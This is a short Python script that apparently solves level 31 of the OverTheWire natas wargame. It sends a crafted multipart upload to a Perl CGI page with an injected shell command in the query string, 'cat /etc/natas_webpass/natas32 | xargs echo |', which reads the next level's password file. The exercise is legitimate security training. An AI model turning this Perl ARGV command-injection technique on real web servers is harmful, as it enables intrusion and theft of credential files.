"""
Help script to resolve natas challenge #31
"""
import requests
import json

level = 'natas31'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we exploit the vulnerability described in the document
The Pearl Jam. Section "The Pinnacle"
"""

'''
To upload a file we need the header:
Content-Type: multipart/form-data; boundary=---------------------------157700418326290811436937502
And the params:
    -----------------------------157700418326290811436937502
    Content-Disposition: form-data; name="file"
    
    ARGV
    -----------------------------157700418326290811436937502
    Content-Disposition: form-data; name="file"; filename="abc"
    
    abcde
    -----------------------------157700418326290811436937502
    Content-Disposition: form-data; name="submit"
    
    Upload
    -----------------------------157700418326290811436937502--
'''

response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)
print(response.text)
